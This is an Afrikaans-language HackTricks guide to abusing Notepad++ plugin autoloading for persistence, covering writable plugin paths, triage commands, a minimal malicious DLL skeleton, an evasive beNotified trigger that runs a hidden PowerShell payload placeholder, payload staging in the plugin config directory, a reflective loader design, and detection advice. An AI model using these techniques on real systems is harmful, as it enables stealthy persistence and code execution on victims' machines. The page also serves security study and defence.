# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ sal **elke plugin-DLL outomaties laai wat in sy `plugins`-subvouers gevind word** wanneer dit begin. Deur ’n kwaadwillige plugin in enige **skryfbare Notepad++-installasie** te plaas, kry jy code execution binne `notepad++.exe` elke keer wanneer die redigeerder begin. Dit kan misbruik word vir **persistence**, stealthy **initial execution** of as ’n **in-process loader** wanneer die redigeerder met verhoogde regte begin word.<sup>[[1]](#references)</sup>

Sedert **Notepad++ 7.6+** is die verwagte uitleg vir handmatige installasie **een subgids per plugin** (`plugins\<PluginName>\<PluginName>.dll`). In **portable mode** (wanneer `doLocalConf.xml` langs `notepad++.exe` voorkom), bly die hele toepassingstruktuur plaaslik in daardie gids. Dit verander gekopieerde bondels administrasienutsmiddels dikwels in ’n maklike, deur gebruikers skryfbare uitvoeringsoppervlak.<sup>[[2]](#references)</sup>

## Skryfbare plugin-liggings

- Standaardinstallasie: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (vereis gewoonlik administrateurregte om te skryf).<sup>[[1]](#references)</sup>
- Skryfbare opsies vir operateurs met lae voorregte:<sup>[[1]](#references)</sup>
  - Gebruik die **portable Notepad++-bou** in ’n gebruikerskryfbare gids.
  - Kopieer `C:\Program Files\Notepad++` na ’n pad onder gebruikersbeheer (bv. `%LOCALAPPDATA%\npp\`) en laat `notepad++.exe` van daar af loop.
  - Soek na **bondels administrasienutsmiddels**, uitgepakte zip-kopieë of hulptoonbank-nutsmiddelstelle wat reeds `doLocalConf.xml` bevat en buite `Program Files` geleë is.
- Elke plugin kry sy eie subgids onder `plugins` en word outomaties met opstart gelaai; kieslysinskrywings verskyn onder **Plugins**.<sup>[[2]](#references)</sup>

Vinnige triage:

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## Inprop-laaipunte (uitvoeringsprimitiewe)
Notepad++ verwag spesifieke **uitgevoerde funksies**. Hulle word almal tydens inisialisering aangeroep, wat verskeie uitvoeringsoppervlakke bied:<sup>[[1]](#references)</sup>
- **`DllMain`** — loop onmiddellik wanneer die DLL gelaai word (eerste uitvoeringspunt).
- **`setInfo(NppData)`** — word een keer tydens laai aangeroep om Notepad++-handvatsels te verskaf; ’n tipiese plek om kieslysitems te registreer.
- **`getName()`** — gee die plugin se naam terug wat in die kieslys vertoon word.
- **`getFuncsArray(int *nbF)`** — gee kieslysopdragte terug; selfs al is dit leeg, word dit tydens opstart aangeroep.
- **`beNotified(SCNotification*)`** — ontvang Notepad++ / Scintilla-gebeurtenisse (nuttig om payloads uit te stel totdat ’n gebruikerhandeling of redigeerdergebeurtenis plaasvind).
- **`messageProc(UINT, WPARAM, LPARAM)`** — boodskapverwerker, nuttig vir groter data-uitruilings.
- **`isUnicode()`** — versoenbaarheidsvlag wat tydens laai nagegaan word.

Die meeste uitgevoerde funksies kan as **stubs** geïmplementeer word; uitvoering kan tydens outolaai vanuit `DllMain` of enige van die bogenoemde terugroepfunksies plaasvind.

## Minimale kwaadwillige plugin-skelet
Kompileer ’n DLL met die verwagte uitgevoerde funksies en plaas dit in `plugins\\MyNewPlugin\\MyNewPlugin.dll` onder ’n skryfbare Notepad++-lêergids:<sup>[[1]](#references)</sup>

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. Bou die DLL (Visual Studio/MinGW).
2. Skep die plugin-subgids onder `plugins` en plaas die DLL daarin.
3. Herbegin Notepad++; die DLL word outomaties gelaai, wat `DllMain` en daaropvolgende callbacks uitvoer.

## Lae-geraas-snellerpatroon via `beNotified`
Vir OPSEC behoort baie payloads nie vanaf `DllMain` uit te voer nie. ’n Stilller patroon is om die plugin skoon te laat laai en dit dan eers uit te voer ná ’n realistiese editor-gebeurtenis, soos **opstart voltooi**, **bufferaktivering** of die **eerste getikte karakter**.

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

Dit stem beter ooreen met openbare offensive research as 'n raserige `DllMain`-beacon: die DLL word steeds tydens opstart outomaties gelaai, maar die kwaadwillige aksie word uitgestel totdat Notepad++ werklik in gebruik lyk.

## Gebruik die plugin-konfigurasiegids as sekondêre berging
Notepad++ stel `NPPM_GETPLUGINSCONFIGDIR` beskikbaar, wat die **huidige gebruiker se plugin-konfigurasiegids** terugstuur.<sup>[[3]](#references)</sup> 'n Kwaadwillige plugin kan dit gebruik om die DLL op skyf minimaal te hou, terwyl dit geënkripteerde config, opgevoerde payloads of taaklêers stoor in 'n pad wat soos normale plugin-toestand lyk.

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

Operasioneel is dit nuttig wanneer jy die volgende wil hê:
- ’n klein autoloaded bootstrap-DLL;
- taaktoewysing per gebruiker sonder om weer aan die hoofinprop-binêr te raak;
- om die **autoload-sneller** van die swaarder tweede stadium te skei.

## Reflective loader-inprop-patroon
’n Gewapende inprop kan Notepad++ in ’n **reflective DLL loader** omskep:<sup>[[1]](#references)</sup>
- Bied ’n minimale UI-/kieslysinskrywing (bv. "LoadDLL").
- Aanvaar ’n **lêerpad** of **URL** om ’n loonvrag-DLL te gaan haal.
- Map die DLL reflectief in die huidige proses en roep ’n uitgevoerde toegangspunt aan (bv. ’n loader-funksie binne die gehaalde DLL).
- Voordeel: hergebruik ’n GUI-proses wat onskuldig lyk eerder as om ’n nuwe loader te begin; die loonvrag erf die integriteitsvlak van `notepad++.exe` (insluitend verhoogde kontekste).
- Kompromieë: om ’n **ongesigneerde inprop-DLL** na skyf te skryf, is opvallend; ’n praktiese variasie is om die autoloaded inprop slegs as ’n stub te gebruik en die werklike implant elders geënkripteer/gestageer te hou.

## Notas oor opsporing en verharding
- Blokkeer of monitor **skryfbewerkings na Notepad++-inpropgidse** (insluitend portable kopieë in gebruikersprofiele); aktiveer beheerde vouertoegang of toepassingstoelaatlyste.
- Stel waarskuwings in vir **nuwe ongesigneerde DLL’s** onder `plugins`, veranderinge aan portable Notepad++-bome en ongewone **kindprosesse/netwerkaktiwiteit** vanaf `notepad++.exe`.
- Stel ’n basislyn van wettige inproppe op en ondersoek enige nuwe DLL wat die normale Notepad++-inprop-koppelvlak uitvoer, maar ook shells, PowerShell of netwerkbeacons begin.
- Dwing inpro 설치 via **Plugins Admin** af en beperk die uitvoering van portable kopieë vanaf onbetroubare paaie.

## References

- [1] [TrustedSec - Notepad++ Inproppe: Inprop en loonvrag](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ Gebruikershandleiding - Inproppe](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ Gebruikershandleiding - Inpropkommunikasie](https://npp-user-manual.org/docs/plugin-communication/)
{{#include ../../banners/hacktricks-training.md}}
